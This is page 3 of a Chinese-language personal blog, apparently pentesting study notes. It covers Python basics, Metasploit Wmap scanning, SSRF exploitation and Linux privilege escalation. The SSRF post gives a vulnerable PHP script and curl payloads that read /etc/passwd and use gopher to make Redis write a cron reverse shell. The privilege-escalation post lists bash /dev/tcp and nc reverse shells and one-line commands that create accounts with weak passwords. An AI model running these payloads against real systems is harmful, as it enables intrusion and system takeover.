string.replace(str1, str2, num=string.count(str1))      // 把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次
</code></pre><h4 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h4><pre><code>list1=[&quot;how&quot;,&quot;are&quot;]
list2=[&quot;you&quot;,&quot;?&quot;]

print (list1[0])              #读取列表中第一个元素
print (list1[0:2])              #从第一个元素开始截取列表 截取个数为2  
print (list2*2)                  #将列表中元素重复
print (lis t1+list2)          #列表中数据组合
list1.append(&quot;hello&quot;)         #在列表最后添加新的元素
print (list1)        
del(list1[2])                  #删除索引为2的元素
print (list1)
list3=&quot;fine&quot;
print (list(list3))              #输出[&apos;f&apos;, &apos;i&apos;, &apos;n&apos;, &apos;e&apos;]
list4=(&quot;asd&quot;,&quot;ds&quot;,&quot;qw&quot;)
print (list(list4))              #将元素转换为列表
</code></pre><h4 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h4><pre><code>注: 元组中元素值不允许被修改，但可对其进行连接组合，生成新的元组
元组创建方法：
tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000)
tup2 = (1, 2, 3, 4, 5 )
tup3 = &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;
tup4=(&quot;a&quot;,)                   #元组中只包含一个元素时，需要在元素后面添加逗号

tuple(tup)              #将列表转换为元祖
cmp(tuple1, tuple2)           #比较的元素是同类型的,则比较其值,返回结果；两个元素不是同一种类型,则检查它们是否是数字，如果是数字,执行必要的数字强制类型转换,然后比较。如果有一方的元素是数字,则另一方的元素&quot;大&quot;(数字是&quot;最小的&quot;) 。否则,通过类型名字的字母顺序进行比较
len(tuple1, tuple2)           #计算元组元素个数
max(tuple)                    #返回元组中元素最大值
min(tuple)                    #返回元组中元素最小值
del tup;                      #删除元组
</code></pre><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><pre><code>内置函数
    列表是有序的对象集合，字典是无序的对象集合
    键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一
    值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组
  d={key1:value1,key2:values}
  cmp(dict1, dict2)     #字典元素相同则返回0，如果dict1大于dict2返回1，如果字典dict1小于字典dict2返回-1
  len(dict)             #返回字典的元素个数，即键的总数
  str(dict)             #返回字符串
  type(dict)            #返回输入的变量类型

内置方法
   dict.clear()      #删除字典内所有元素
   dict.copy()       #返回一个字典的浅复制
        实例：
          d={&quot;zhang&quot;:123,&quot;liu&quot;:456,&quot;zhao&quot;:789}
          d1=d.copy()    # 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用
          d2=d         # 浅拷贝: 引用对象
          print (d1)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          print (d2)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          d[&quot;zhang&quot;]=111
          print (d1)    #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
          print (d2)    #输出 {&apos;zhang&apos;: 111, &apos;liu&apos;: 456, &apos;zhao&apos;: 789}
</code></pre><h4 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h4><pre><code>注：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。 
s.add( x )         #将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作
s.remove( x )      #将元素 x 添加到集合 s 中移除，如果元素不存在，则会发生错误
s.discard( x )     #移除集合中的元素，且如果元素不存在，不会发生错误
s.pop()            #随机删除集合中的一个元素
s.clear()          #清空集合s
len(s)             #计算集合 s 元素个数
x in s             #判断元素 s 是否在集合 x 中存在，存在返回 True，不存在返回 False
</code></pre><h5 id="python-位运算符"><a href="#python-位运算符" class="headerlink" title="python 位运算符"></a>python 位运算符</h5><pre><code>a = 0011 1100
b = 0000 1101

a&amp;b = 0000 1100       # 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0
a|b = 0011 1101       # 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。
a^b = 0011 0001       # 按位异或运算符：当两对应的二进位相异时，结果为1 
~a  = 1100 0011      # 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x 类似于 -x-1
</code></pre><h5 id="python-逻辑运算符"><a href="#python-逻辑运算符" class="headerlink" title="python 逻辑运算符"></a>python 逻辑运算符</h5><pre><code>x and y   # 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值 
x or y      # 布尔&quot;或&quot; - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值
not x     # 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True
</code></pre><h5 id="python-传不可变对象实例"><a href="#python-传不可变对象实例" class="headerlink" title="python 传不可变对象实例"></a>python 传不可变对象实例</h5><pre><code>def ChangeInt( a ):
        a = 10
b = 2
ChangeInt(b)
print( b )             # 结果是 2

实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它
</code></pre><h5 id="传可变对象实例"><a href="#传可变对象实例" class="headerlink" title="传可变对象实例"></a>传可变对象实例</h5><pre><code># 定义可修改函数
def changeme( mylist ):
   mylist.append([1,2,3,4])
   print (&quot;函数内取值: &quot;, mylist)  输出 函数内取值:  [10, 20, 30, [1, 2, 3, 4]]
   return

# 调用changeme函数
mylist = [10,20,30]
changeme( mylist )
print (&quot;函数外取值: &quot;, mylist)    #输出 函数外取值:  [10, 20, 30, [1, 2, 3, 4]]
</code></pre><h5 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h5><ul>
<li><p>加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数</p>
<pre><code>实例：
    def printinfo( arg1, *vartuple ):
    print (arg1)           
    print (vartuple)      
printinfo( 70, 60, 50 )       # 输出     70
                              #        （60,50）
</code></pre></li>
<li><p>加了两个星号 ** 的参数会以字典的形式导入</p>
<pre><code>实例：
   def printinfo( arg1, **vardict ):
   print (arg1)
   print (vardict)
printinfo(1, a=2,b=3)      # 输出   1
                           #       {&apos;a&apos;: 2, &apos;b&apos;: 3}
</code></pre></li>
</ul>
<h5 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h5><pre><code>Python的作用域一共有4种
    L （Local） 局部作用域
    E （Enclosing） 闭包函数外的函数中
    G （Global） 全局作用域
    B （Built-in） 内建作用域
以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内建中找
x = int(2.9)  # 内建作用域
g_count = 0  # 全局作用域
def outer():
    o_count = 1  # 闭包函数外的函数中
    def inner():
        i_count = 2  # 局部作用域
</code></pre><h5 id="nonlocal-关键字"><a href="#nonlocal-关键字" class="headerlink" title="nonlocal 关键字"></a>nonlocal 关键字</h5><ul>
<li><p>nonlocal适用于嵌套函数中内部函数修改外部变量的值</p>
<pre><code>实例：
 def outer():
       num = 10
       def inner():
           nonlocal num   # nonlocal关键字声明
           num = 100
           print(num)     #输出 100
        inner() 
        print(num)       #输出 100
 outer()
</code></pre></li>
</ul>
<h5 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h5><ul>
<li><p>实例1</p>
<pre><code>l=[&quot;   ho w&quot;,&quot;   are   &quot;,&quot;you   &quot;]
print ([l1.strip() for l1 in l])      #输出 [&apos;ho w&apos;, &apos;are&apos;, &apos;you&apos;]
</code></pre></li>
<li><p>实例2：</p>
<pre><code>l=[123,45,3]
print ([l1*2 for l1 in l if l1 &gt; 2])    #输出 [246, 90, 6]
</code></pre></li>
<li><p>实例3</p>
<pre><code>l1=[1,2,3]
l2=[11,12,13]
l3=[x*y for x in l1 for y in l2]
print (l3)        #输出 [11, 12, 13, 22, 24, 26, 33, 36, 39]
</code></pre></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/Metasploit渗透测试/Web扫描器-Metasploit'-Wmap/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/Metasploit渗透测试/Web扫描器-Metasploit'-Wmap/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Metasploit’Wmap-Web扫描器使用"><a href="#Metasploit’Wmap-Web扫描器使用" class="headerlink" title="Metasploit’Wmap Web扫描器使用"></a>Metasploit’Wmap Web扫描器使用</h3><p>第一次使用需要初始化并启动数据库</p>
<p> <img src="https://upload-images.jianshu.io/upload_images/12585049-8567c6c0bd2769bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
<ol>
<li>启动 metasploit<br> <code>root@kaili:~# msfconsole</code></li>
<li><p>进入控制台，加载wmap模块<br> <code>msf &gt; load_wmap</code><br>成功加载如下图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9a444a6cbbad26b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
</li>
<li><p>help 查看 wmap 参数<br> <code>msf &gt; help</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-2c272a073a60d745.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
</li>
<li><p>添加扫描站点<br> <code>msf &gt; wmap_sites -a http://X.X.X.X</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-8938c9110e5ab067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
</li>
<li><p>查看扫描站点<br> <code>msf &gt; wmap_sites -l</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-4e208dc3d0843da4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
</li>
</ol>
<p>若添加错误，删除站点可以用<br>    <code>msf &gt; wmap_sites -d &lt;Id&gt;</code></p>
<ol start="6">
<li><p>设置扫描站点<br> <code>msf &gt; wmap_targets -d &lt;Id&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-0ea5b511fb7c882b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
</li>
<li><p>查看扫描目标列表<br> <code>msf &gt; wmap_targets -l</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-32a1da0ed10680b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
</li>
<li><p>载入扫描需要使用的 EXP 模块<br> <code>msf &gt; wmap_run -t</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-f944b66d16b640d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
<p> -m 参数和正则表达式使用可以选择使用模块</p>
</li>
<li><p>开始进行扫描<br> <code>msf &gt; wmap_run -e</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-b9719ee091d9e6a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
</li>
<li><p>查看扫描结果汇总<br><code>msf &gt; wmap_vluns -l</code><br>或者可以直接使用 vluns 结果一样</p>
</li>
</ol>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><hr> Wmap借助于Metasploit的模块扫描目标应用和主机的漏洞。它从Metasploit的数据库和模块中获取目标主机和应用的信息并将扫描结果返回给数据库。允许用户使用和配置Metasploit中的辅助模块，对网站进行集中扫描。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/03/SSRF漏洞学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/03/SSRF漏洞学习/" itemprop="url">SSRF漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-03T14:49:10+08:00">
                2018-12-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="什么是-SSRF-？"><a href="#什么是-SSRF-？" class="headerlink" title="什么是 SSRF ？"></a>什么是 SSRF ？</h4><p>简介：SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。<hr></p>
<h4 id="SSRF危害即可以实现的攻击行为"><a href="#SSRF危害即可以实现的攻击行为" class="headerlink" title="SSRF危害即可以实现的攻击行为"></a>SSRF危害即可以实现的攻击行为</h4><ol>
<li>主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<code>Banner</code>信息</li>
<li>攻击运行在内外网主机的应用程序</li>
<li>通过访问默认文件对内网 <code>Web</code> 应用进行指纹识别</li>
<li>攻击内外网的 <code>Web</code> 应用，主要是使用 <code>GET</code>参数就可以实现的攻击</li>
<li>利用<code>file</code>协议读取本地文件</li>
</ol>
<hr>

<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>本地利用</li>
</ul>
<p>利用方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议查看文件</span><br><span class="line">curl -v &apos;file:///etc/passwd&apos;            </span><br><span class="line"></span><br><span class="line"># 利用dict探测端口</span><br><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure>
<p><code>windows</code>下使用<code>curl</code>命令需要把单引号换成双引号</p>
<ul>
<li>远程利用</li>
</ul>
<p>例 1<br>  <code>ssrf.php</code> （未做任何ssrf防御）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    // 创建一个新cURL资源</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    // 设置URL和相应的选项</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    // 抓取URL并把它传递给浏览器</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    // 关闭cURL资源，并且释放系统资源</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>利用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议任意文件读取</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># 利用dict协议查看端口</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure></p>
<p>例 2<br><code>ssrf2.php</code><br>    限制协议为HTTP、HTTPS<br>    设置跳转重定向为True（默认不跳转）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">    // 限制为HTTPS、HTTP协议</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><hr><br>参考链接：<a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/03/web安全/index/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/03/web安全/index/" itemprop="url">web安全</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-03T14:48:33+08:00">
                2018-12-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/02/linux提权/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/02/linux提权/" itemprop="url">linux提权</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-02T20:25:53+08:00">
                2018-12-02
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>参考链接：<br><a href="https://www.tuicool.com/articles/NzMJRjm" target="_blank" rel="noopener">https://www.tuicool.com/articles/NzMJRjm</a><br><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87017</a></p>
<p>在获取靶机<code>shell</code>之后，首先看一下是什么权限，权限低的话就要进行提权了</p>
<p> 常规思路：</p>
<ol>
<li>检查漏洞系统的操作系统发行版<blockquote>
<p>cat /etc/issue<br>cat /etc/*-release</p>
</blockquote>
</li>
<li>查看内核版本(获取版本后可使用<code>kali</code>自带的<code>searcsploit</code>搜寻漏洞利用代码)<blockquote>
<p>uname -a</p>
</blockquote>
</li>
<li><p>检查可用的用户及当前用户的权限</p>
<blockquote>
<p>whoami</p>
</blockquote>
</li>
<li><p>列出SUID文件（SUID目的是让本来没有相应权限的用户运行这个程序时可以访问没有权限访问的资源）</p>
<blockquote>
<p>find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb {} \;<br>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
</blockquote>
</li>
</ol>
<p>已知可以用来提权的linux可执行文件：<code>nmap</code> <code>vim</code> <code>find</code> <code>Bash</code> <code>More</code> <code>Less</code> <code>Nano</code> <code>cp</code></p>
<ol start="5">
<li>查看安装的包、程序、运行的服务。过时的版本可能存在漏洞。</li>
</ol>
<h4 id="Bash-反弹-shell"><a href="#Bash-反弹-shell" class="headerlink" title="Bash 反弹 shell"></a>Bash 反弹 shell</h4><p>bash 一句话反弹</p>
<blockquote>
<p>本地 nc -l -p 8080<br> 靶机 bash -i &gt;&amp; /dev/tcp/192.168.1.1/8080 0&gt;&amp;1</p>
</blockquote>
<pre><code>    命令                      命令详解
bash -i               产生一个bash交互环境
&gt;&amp;                    将联合符号前面的内容与后面相结合然后一起重定向给后者
/dev/tcp/ip/端口      linux 环境中所有的内容都是以文件的形式存在的，让主机与目标主机ip:端口建立一个TCP连接 
0&gt;&amp;1                  将 标准的输入 与 标准输出 内容相结合，然后重定向给前面  标准的输出 内容
</code></pre><p>详细解读过程：<code>bash</code>产生了一个交互环境与本地主机主动发起与目标主机<code>8080</code>端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。</p>
<h4 id="Netcat-工具反弹"><a href="#Netcat-工具反弹" class="headerlink" title="Netcat 工具反弹"></a>Netcat 工具反弹</h4><ol>
<li>开启外网主机监听<blockquote>
<p>root@kali:~#nc -lvpp 4050</p>
</blockquote>
</li>
<li>netcat 反弹一句话<blockquote>
<p>靶机$：nc ip 端口 -t -e /bin/bash</p>
</blockquote>
</li>
</ol>
<p>通过靶机webshell使用nc命令建立一个<code>ip:端口</code>的会话连接，将本地shell通过这个会话反弹给目标主机</p>
<h4 id="python-标准虚拟终端获取"><a href="#python-标准虚拟终端获取" class="headerlink" title="python 标准虚拟终端获取"></a>python 标准虚拟终端获取</h4><p>python一句话获取标准<code>shell</code></p>
<blockquote>
<p> python -c “import pty;pty.spawn(‘/bin/bash’)”</p>
</blockquote>
<pre><code> 命令                                命令详解
 -c                       命令行执行 
import pty                引入标准库pty           
pty.spawn                 使用pty的spawn方法调用/bin/bash获取一个标准的shell
</code></pre><h4 id="Linux-一句话添加账户"><a href="#Linux-一句话添加账户" class="headerlink" title="Linux 一句话添加账户"></a>Linux 一句话添加账户</h4><ol>
<li>chpasswd 方法<blockquote>
<p>useradd test;echo ‘test:123456’|chpasswd</p>
</blockquote>
</li>
<li>useradd -p 方法<blockquote>
<p>useradd -p `openssl passwd 123456` guest</p>
</blockquote>
</li>
<li>echo -e 方法<blockquote>
<p>useradd test;echo -e “123456n123456n” |passwd test</p>
</blockquote>
</li>
</ol>
<p><br><hr>其他的感觉不是经常使用，就没有再做笔记了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">wcute</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">29</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">wcute</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
